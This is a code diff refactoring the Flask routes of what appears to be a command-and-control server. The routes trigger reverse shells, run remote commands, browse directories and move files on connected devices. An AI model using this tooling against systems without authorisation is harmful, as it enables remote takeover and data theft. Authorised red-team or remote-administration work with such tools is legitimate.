@@ -26,16 +26,16 @@ def devices_bp(server: ServerClass):
     @devices_bp.route("/reverse_shell", methods=["POST"])
     @authorized
     def post_reverse_shell():
-        use_json = request.args.get("json", "").lower() == "true"
-        id = request.form.get("id")
+        device_id = request.args.get("id")
         address = request.form.get("address")
         port = request.form.get("port")
-    
-        if not id.isdigit():
+
+        if not device_id.isdigit():
             return generate_response("error", "Invalid ID.", "devices", 400)
-        id = int(id)
+        device_id = int(device_id)
+
         try:
-            server.get_active_handler(id).reverse_shell(address, port)
+            server.get_active_handler(device_id).reverse_shell(address, port)
         except Exception as e:
             return generate_response("error", str(e), "listeners", 500)
         else:
@@ -44,34 +44,32 @@ def devices_bp(server: ServerClass):
     @devices_bp.route("/rce", methods=["POST"])
     @authorized
     def post_rce():
-        use_json = request.args.get("json", "").lower() == "true"
-        id = request.form.get("id")
+        device_id = request.args.get("id")
         cmd = request.form.get("cmd")
 
-        if not id.isdigit():
+        if not device_id .isdigit():
             return generate_response("error", "Invalid ID.", "devices", 400)
-        id = int(id)
+        device_id = int(device_id)
 
         try:
-            output = server.get_active_handler(id).rce(cmd)
+            output = server.get_active_handler(device_id).rce(cmd)
         except Exception as e:
             return generate_response("error", str(e), "listeners", 500)
         else:
             return generate_response("success", output, "listeners")
 
-    @devices_bp.route("/infos", methods=["GET"])
+    @devices_bp.route("/info", methods=["GET"])
     @authorized
     def get_infos():
-        use_json = request.args.get("json", "").lower() == "true"
-        id = request.args.get("id", "")
+        device_id = request.args.get("id", "")
 
-        if not id.isdigit():
+        if not device_id .isdigit():
             return generate_response("error", "Invalid ID.", "devices", 400)
-        id = int(id)
+        device_id = int(device_id)
 
-        output = server.get_active_handler(id).infos()
+        output = server.get_active_handler(device_id).infos()
         try:
-            output = server.get_active_handler(id).infos()
+            output = server.get_active_handler(device_id).infos()
         except Exception as e:
             return generate_response("error", str(e), "listeners", 500)
         else:
@@ -80,33 +78,15 @@ def devices_bp(server: ServerClass):
     @devices_bp.route("/dir", methods=["GET"])
     @authorized
     def get_dir():
-        use_json = request.args.get("json", "").lower() == "true"
-        id = request.args.get("id", "")
+        device_id = request.args.get("id", "")
         dir = request.args.get("dir")
 
-        if not id.isdigit():
+        if not device_id .isdigit():
             return generate_response("error", "Invalid ID.", "devices", 400)
-        id = int(id)
+        device_id = int(device_id)
         try:
-            output = server.get_active_handler(id).get_directory_contents(dir)
-        except Exception as e:
-            return jsonify({"status": "error", "message": str(e)})
-        else:
-            return jsonify({"status": "success", "message": output})
-
-    @devices_bp.route("/file-contents", methods=["GET"])
-    @authorized
-    def get_file_contents():
-        use_json = request.args.get("json", "").lower() == "true"
-        id = request.args.get("id", "")
-        path = request.args.get("path")
-        if not id.isdigit():
-            return generate_response("error", "Invalid ID.", "devices", 400)
-        id = int(id)
-        if path is None:
-            return generate_response("error", "File path is missing.", "devices", 400)
-        try:
-            output = server.get_active_handler(int(id)).get_file_contents(path)
+            output = server.get_active_handler(
+                device_id).get_directory_contents(dir)
         except Exception as e:
             return jsonify({"status": "error", "message": str(e)})
         else:
@@ -115,12 +95,11 @@ def devices_bp(server: ServerClass):
     @devices_bp.route("/upload", methods=["POST"])
     @authorized
     def post_upload():
-        use_json = request.args.get("json", "").lower() == "true"
-        id = request.form.get("id")
-        remote_path = request.form.get("remote_path")
-        if not id.isdigit():
+        device_id = request.args.get("id")
+        remote_path = request.args.get("path")
+        if not device_id.isdigit():
             return generate_response("error", "Invalid ID.", "devices", 400)
-        id = int(id)
+        device_id = int(device_id)
         # check if file is in request
         if not "file" in request.files:
             return generate_response("error", "The as_file parameter is true, but no file was given.", "devices", 400)
@@ -128,7 +107,7 @@ def devices_bp(server: ServerClass):
             return generate_response("error", "Upload path is missing.", "devices", 400)
         try:
             output = server.get_active_handler(
-                id).file_upload(request.files.get('file'), remote_path)
+                device_id).file_upload(request.files.get('file'), remote_path)
         except Exception as e:
             return generate_response("error", str(e), "devices", 500)
         else:
@@ -137,16 +116,16 @@ def devices_bp(server: ServerClass):
     @devices_bp.route("/download", methods=["GET"])
     @authorized
     def get_download():
-        use_json = request.args.get("json", "").lower() == "true"
-        id = request.args.get("id", "")
+        device_id = request.args.get("id", "")
         remote_path = request.args.get("path")
-        if not id.isdigit():
+        if not device_id .isdigit():
             return generate_response("error", "Invalid ID.", "devices", 400)
-        id = int(id)
+        device_id = int(device_id)
         if remote_path is None:
             return generate_response("error", "File path is missing.", "devices", 400)
         try:
-            file = server.get_active_handler(id).file_download(remote_path)
+            file = server.get_active_handler(
+                device_id).file_download(remote_path)
         except Exception as e:
             return generate_response("error", str(e), "/devices", 500)
         else:
